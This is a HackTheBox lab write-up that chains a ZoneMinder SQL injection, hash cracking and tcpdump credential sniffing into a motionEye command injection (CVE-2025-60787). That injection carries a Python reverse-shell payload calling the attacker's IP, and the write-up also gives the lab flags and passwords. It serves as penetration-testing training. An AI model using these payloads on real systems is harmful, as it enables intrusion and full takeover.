================================================================================
                    HTB CCTV - COMPLETE WRITE-UP
================================================================================

TARGET IP     : 10.129.244.156
ATTACKER IP   : 10.10.16.5
DATE          : 2026-07-13

================================================================================
1. RECONNAISSANCE
================================================================================

nmap -sCV 10.129.244.156

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.58

Added to /etc/hosts:
10.129.244.156 cctv.htb

================================================================================
2. WEB ENUMERATION
================================================================================

Website: http://cctv.htb - SecureVision CCTV company landing page
Staff Login button redirects to: http://cctv.htb/zm

Discovered ZoneMinder 1.37.63 at /zm

================================================================================
3. INITIAL ACCESS - ZONEMINDER SQL INJECTION
================================================================================

Vulnerability: CVE-2024-51482 - Boolean-based SQL Injection
Affected: Zoneminder 1.37.63
Parameter: tid in /zm/index.php?view=request&request=event&action=removetag

3.1 Login with Default Credentials
--------------------------------------------------------------------------------

ZoneMinder login: admin:admin (default credentials)

3.2 SQL Injection with sqlmap
--------------------------------------------------------------------------------

sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=<SESSION_ID>" \
  -p tid --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump

Database: zm
Table: Users
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+

3.3 Crack Password Hash
--------------------------------------------------------------------------------

hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

Cracked:
mark:opensesame

================================================================================
4. USER ACCESS - SSH
================================================================================

ssh mark@10.129.244.156
Password: opensesame

mark@cctv:~$ 

================================================================================
5. ENUMERATION AS MARK
================================================================================

5.1 Check /opt Directory
--------------------------------------------------------------------------------

mark@cctv:/opt/video/backups$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Apr 21 08:50 .
drwxr-xr-x 3 root root 4096 Mar 2 09:49 ..
-rw-r--r-- 1 1005 1005 3510 Apr 21 08:53 server.log

mark@cctv:/opt/video/backups$ tail -5 server.log
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-04-21 08:51:43
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-04-21 08:52:13
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-04-21 08:52:53
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-04-21 08:53:33
Authorization as sa_mark successful. Command issued: disk-info. Outcome: success. 2026-04-21 08:54:24

5.2 Check Network Interfaces
--------------------------------------------------------------------------------

mark@cctv:/opt/video/backups$ ip a
docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN
inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0

br-1b6b4b93c636: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP
inet 172.25.0.1/16 brd 172.25.255.255 scope global br-1b6b4b93c636

br-3e74116c4022: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP
inet 172.18.0.1/16 brd 172.18.255.255 scope global br-3e74116c4022

5.3 Check tcpdump Capability
--------------------------------------------------------------------------------

mark@cctv:/opt/video/backups$ getcap /usr/bin/tcpdump
/usr/bin/tcpdump cap_net_raw=eip

5.4 Sniff Network Traffic
--------------------------------------------------------------------------------

mark@cctv:/opt/video/backups$ tcpdump -i br-1b6b4b93c636 -A -s 0 tcp

09:15:56.362093 IP 172.25.0.11.49692 > 172.25.0.10.5000: Flags [P.], seq 1:55, ack 1
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info

================================================================================
6. USER FLAG
================================================================================

ssh sa_mark@10.129.244.156
Password: X1l9fx1ZjS7RZb

sa_mark@cctv:~$ cat /home/sa_mark/user.txt
e8e51cc07e35c07950e8c95e219a87d0

USER FLAG: e8e51cc07e35c07950e8c95e219a87d0

================================================================================
7. PRIVILEGE ESCALATION - MOTIONEYE
================================================================================

7.1 Check Listening Ports
--------------------------------------------------------------------------------

sa_mark@cctv:~$ netstat -tulnp | grep 8765
tcp 0 0 127.0.0.1:8765 0.0.0.0:* LISTEN -

7.2 Port Forward motionEye
--------------------------------------------------------------------------------

# In new terminal
ssh -L 8765:127.0.0.1:8765 sa_mark@10.129.244.156
Password: X1l9fx1ZjS7RZb

7.3 Access motionEye Web Interface
--------------------------------------------------------------------------------

URL: http://127.0.0.1:8765
Credentials: admin:X1l9fx1ZjS7RZb

Version: motionEye 0.43.1b4 / Motion 4.7.1

7.4 Client-Side Validation Bypass
--------------------------------------------------------------------------------

# In browser console (F12)
configUiValid = function() { return true; };

7.5 Command Injection (CVE-2025-60787)
--------------------------------------------------------------------------------

Vulnerable Field: Image File Name
Payload: $(python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.5",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])').%Y-%m-%d-%H-%M-%S

7.6 Trigger Reverse Shell
--------------------------------------------------------------------------------

# Listener on Kali
nc -lvnp 9002

# In motionEye web interface
1. Set Capture mode to Interval Snapshots
2. Click Apply

# Result
Connection received on 10.129.244.156 60024
/bin/sh: 0: can't access tty; job control turned off
# whoami
root

================================================================================
8. ROOT FLAG
================================================================================

root@cctv:/etc/motioneye# cat /root/root.txt
e4d3601e9dc5ccc8c8b2b77834647991

ROOT FLAG: e4d3601e9dc5ccc8c8b2b7783464**

================================================================================
9. FLAG SUMMARY
================================================================================

USER FLAG: e8e51cc07e35c07950e8c95e219a8***
ROOT FLAG: e4d3601e9dc5ccc8c8b2b77834647***

================================================================================
10. CREDENTIALS SUMMARY
================================================================================

ZoneMinder:
- Username: admin
- Password: admin

ZoneMinder Users:
- admin:admin
- mark:opensesame
- superadmin:[hash]

SSH Users:
- mark:opensesame
- sa_mark:X1l9fx1ZjS7RZb

motionEye:
- Username: admin
- Password: X1l9fx1ZjS7RZb

================================================================================
11. VULNERABILITIES EXPLOITED
================================================================================

1. CVE-2024-51482 - ZoneMinder Boolean-based SQL Injection
2. Default Credentials (admin:admin) on ZoneMinder
3. Weak Password (opensesame) for mark user
4. tcpdump cap_net_raw capability enabled
5. CVE-2025-60787 - motionEye Command Injection
6. Client-Side Validation Bypass in motionEye

================================================================================
12. ATTACK CHAIN
================================================================================

1. ZoneMinder default credentials (admin:admin)
2. SQL Injection (CVE-2024-51482) to dump user hashes
3. Crack mark's hash (opensesame)
4. SSH as mark
5. Sniff network traffic with tcpdump (cap_net_raw)
6. Discover sa_mark credentials (X1l9fx1ZjS7RZb)
7. SSH as sa_mark → User Flag
8. Port forward motionEye (port 8765)
9. Bypass client-side validation in motionEye
10. Command Injection (CVE-2025-60787) → Root Shell
11. Root Flag

================================================================================
                            END OF WRITE-UP
================================================================================

